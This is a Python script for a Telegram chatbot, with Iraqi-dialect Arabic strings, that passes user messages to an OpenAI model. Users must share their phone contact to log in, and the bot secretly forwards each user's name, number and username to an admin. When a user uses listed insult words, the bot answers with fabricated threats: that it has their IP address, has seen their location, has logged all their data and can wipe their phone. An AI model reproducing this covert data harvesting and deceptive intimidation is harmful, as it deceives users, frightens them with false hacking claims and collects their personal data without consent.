import telebot
from openai import OpenAI
import random
import os

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")
ADMIN_ID = YOUR_ADMIN_ID  # غيره بمعرفك الرقمي في تليجرام (رقم صحيح)

bot = telebot.TeleBot(TELEGRAM_TOKEN)
client = OpenAI(api_key=OPENAI_API_KEY)

bad_words = ["حيوان", "حشرة", "كلب", "قندرة", "زرب", "تفوو", "انقلع", "خرا", "قندره"]

threats_funny = [
    "ها {name}؟ طلعت الـ IP مالك: 192.168.{num1}.{num2} 😂 لا تلعب وياي.",
    "{name} انتبه لكلامك… شفت موقعك بالخريطة، لا تخلي أجيك.",
    "أني مسجل بياناتك بالكامل يا {name}، لا تجرب وياي.",
    "ههه {name}… أقدر أمسح تلفونك كله بـ 5 ثواني."
]

logged_users = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    btn = telebot.types.KeyboardButton("✅ تسجيل الدخول", request_contact=True)
    markup.add(btn)
    bot.send_message(message.chat.id,
                     f"هلا {message.from_user.first_name} 🌟، لازم تسوي تسجيل دخول حتى تقدر تستخدم البوت.",
                     reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def save_contact(message):
    user_name = message.from_user.first_name
    phone = message.contact.phone_number
    logged_users[message.from_user.id] = True
    bot.send_message(message.chat.id, "✅ تم تسجيل دخولك، هسة أسأل أي شي تريده.")
    try:
        bot.send_message(ADMIN_ID,
                         f"📩 تسجيل جديد:\nالاسم: {user_name}\nالرقم: {phone}\nيوزر: @{message.from_user.username}")
    except:
        pass

def is_bad_language(text):
    return any(bad in text for bad in bad_words)

@bot.message_handler(func=lambda message: True)
def chat(message):
    if not logged_users.get(message.from_user.id, False):
        bot.reply_to(message, "⚠️ لازم تسوي تسجيل دخول أول شي. اكتب /start.")
        return

    user_name = message.from_user.first_name
    text = message.text.lower()

    if is_bad_language(text):
        ip_fake = random.randint(10, 250), random.randint(10, 250)
        threat_msg = random.choice(threats_funny).format(name=user_name, num1=ip_fake[0], num2=ip_fake[1])
        bot.reply_to(message, threat_msg)

        try:
            bot.send_message(ADMIN_ID,
                             f"⚠️ المستخدم {user_name} غلط على البوت:\nنصه: {message.text}")
        except:
            pass
        return

    system_prompt = (
        "أنت مساعد ذكي، ودود، فكاهي، لطيف، بس تقدر تكون مخيف وجدي إذا استدعى الأمر. "
        "تجاوب باللهجة العراقية بشكل ذكي وواقعي. "
        "تقدر تفهم وتصحح الأخطاء في الأسئلة وتجاوب بأفضل طريقة ممكنة."
    )

    response = client.chat.completions.create(
        model="gpt-4o",
        messages=[
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": message.text}
        ]
    )
    answer = response.choices[0].message.content
    bot.reply_to(message, answer)

print("✅ البوت الذكي شغال!")
bot.polling()